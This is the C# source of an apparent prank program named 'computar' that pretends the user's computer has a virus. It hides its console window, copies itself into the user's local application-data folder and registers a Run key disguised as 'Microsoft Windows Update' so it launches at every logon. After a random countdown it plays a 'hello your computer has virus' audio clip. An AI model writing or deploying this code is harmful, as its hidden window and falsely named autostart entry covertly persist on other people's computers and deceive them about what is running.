using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Timers;

namespace computar
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static int countdown_yur_compiutar_has_vairus = 0;
        static readonly Timer timer1 = new Timer();
        static readonly string location_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), AppDomain.CurrentDomain.FriendlyName);
        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            SetStartup();
            Random rnd = new Random();
            countdown_yur_compiutar_has_vairus = rnd.Next(5, 15);
            timer1.Elapsed += Timer1_Tick;
            timer1.Interval = 1000;
            timer1.Start();
            Console.ReadLine();
        }

        private static async void Timer1_Tick(object sender, EventArgs e)
        {
            if (countdown_yur_compiutar_has_vairus != 0)
                countdown_yur_compiutar_has_vairus--;
            else
            {
                Stream str = Properties.Resources.hello_your_computer_has_virus;
                System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
                snd.Play();
                timer1.Stop();
                await Task.Delay(5000);
                Environment.Exit(0);
            }
        }

        private static void SetStartup()
        {
            if (!File.Exists(location_path))
            {
                File.Copy(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location + "\\" + AppDomain.CurrentDomain.FriendlyName), location_path);
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Microsoft Windows Update", location_path);
                try
                {
                    Process.Start(location_path);
                    Task.Delay(1000);
                    Environment.Exit(0);
                }
                catch (Exception)
                {
                }
            }
        }
    }
}